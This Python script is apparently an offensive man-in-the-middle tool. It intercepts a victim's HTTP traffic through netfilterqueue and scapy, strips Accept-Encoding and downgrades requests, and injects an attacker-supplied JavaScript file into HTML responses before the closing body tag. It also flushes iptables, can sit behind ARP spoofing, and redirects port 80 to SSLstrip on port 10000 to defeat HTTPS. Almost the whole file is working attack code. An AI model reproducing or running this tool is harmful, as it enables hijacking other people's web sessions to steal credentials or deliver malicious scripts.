import netfilterqueue
from scapy.layers.l2 import Raw
from scapy.layers.inet import IP, TCP
import argparse
import os
from termcolor import cprint
import re

END_TAG = '</body>' #TAG to be replaced in HTML load
SCRIPT_TAG = '<script>CODE</script>' #TAG to be insert in HTML load
PORT = 80 #PORT for detection of packets (80 HTTP, 10000 HTTPS with SSLstrip)
LINE = '____________________________________________________________'


'''
Process each packet on Network filter queue
'''
def process_packet(packet):
    global PORT
    
    #Evaluate IP packet filtered
    IP_pkt = IP(packet.get_payload())
    
    #If the IP packet has TCP layer and Raw Layer (it can be HTTP packet)
    if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
        try:
            #Decode load of TCP packet
            load = IP_pkt[Raw].load.decode()
        
            #IP packet from the victim to the server
            #destination port = 80 (port of HTTP server)
            if IP_pkt[TCP].dport == PORT:
                cprint('Request', 'red', attrs=['bold',])
                
                '''Search for Accept-Encoding Header (?\\r\\n = stop at first occurrence of \\r\\n)
                Remove Accept-Encoding header from request(we don't understand any encoding)
                Remove also Chunked-Encoding by using HTTP/1.0
                '''
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                load = load.replace('HTTP/1.1', 'HTTP/1.0')
                IP_pkt[Raw].load = load

                #Scapy recomputes them
                del IP_pkt[IP].len
                del IP_pkt[IP].chksum
                del IP_pkt[TCP].chksum

                packet.set_payload(bytes(IP_pkt))

            #IP packet from the server to the victim
            #source port = 80 (port of HTTP server)
            elif IP_pkt[TCP].sport == PORT:
                cprint('Response', 'blue', attrs=['bold',])
                load = injection_code(load)

                IP_pkt[Raw].load = load
        
                #Scapy recomputes them
                del IP_pkt[IP].len
                del IP_pkt[IP].chksum
                del IP_pkt[TCP].chksum

                packet.set_payload(bytes(IP_pkt))
        
        except UnicodeDecodeError:
            #If python convertion (decode) fails for some bytes
            #(No HTML code, so I don't want to analyse this packet)
            pass
    
    packet.accept()


'''
Injection of javascript code in HTML load
'''
def injection_code(load):
    global END_TAG, SCRIPT_TAG

    #If the HTML page has TAG, I'm going to replace it with javascript code
    load = load.replace(END_TAG, SCRIPT_TAG+END_TAG)
    #If ?: for group (), group used to locate expression but it's not stored in expression
    content_length_header = re.search("(?:Content-Length:\s)(\d*)", load)

    if content_length_header and 'text/html' in load:
        content_length = content_length_header.group(1)
        print(f'Length {content_length}', end='')
        new_length = int(content_length) + len(SCRIPT_TAG)
        print(f'     {new_length}')
        load = load.replace(content_length, str(new_length))
        print(f'     {load}')

    return load


'''
Parser of command line argument
'''
def args_parser():
    global SCRIPT_TAG
    
    #Parser of command line arguments
    parser = argparse.ArgumentParser()

    #Initialization of needed arguments
    parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
    parser.add_argument("-file", "-f", dest="file", help="Name of javascript file to use.")
    parser.add_argument("-https", dest="https", help="If specified, it bypass HTTPS connection. Otherwise, it works on HTTP connection.", action='store_true')

    #Parse command line arguments
    args = parser.parse_args()

    if args.file and os.path.exists(args.file) and os.path.isfile(args.file) and ('.js') in args.file:
        f = open(args.file, 'r')
        code = f.read().replace('\n', '')
        SCRIPT_TAG = SCRIPT_TAG.replace('CODE', code)
        print(SCRIPT_TAG)
    else:
        cprint('\n\n[ERROR] Missing file', 'red', attrs=['bold',], end='\n\n')
        parser.print_help()
        exit(1)

    return args.local, args.https


'''
Main function
'''
def main():
    global PORT
    local, https = args_parser()

    #Packets are blocked and not forwarded
    if local or https:
        os.system('iptables -F')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
        
        if https:
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
    
    else:
        os.system('iptables -F')
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')

    if https:
        PORT = 10000

    #queue num = 0
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        cprint(f'\nTCP packets\n{LINE}','green', attrs=['bold',])
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        cprint(f'\n{LINE}','green', attrs=['bold',])
        print('Flushing ip table.', end='\n')
        cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
        os.system('iptables -F')


if __name__=='__main__':
	main()
